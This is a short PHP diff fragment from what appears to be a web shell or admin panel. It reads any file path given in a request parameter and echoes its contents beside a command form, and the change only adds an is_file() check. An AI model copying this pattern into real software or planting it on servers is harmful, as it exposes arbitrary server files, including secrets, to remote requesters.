@@ -32,7 +32,7 @@ if($_REQUEST['do']){
     $cmd = '';
     $file = $_GET['f'] ?? '';
     $content = '';
-    if($file){
+    if(is_file($file)){
         $content = file_get_contents($file);
     }
     echo cmdform($cmd).contentform($file, $content);
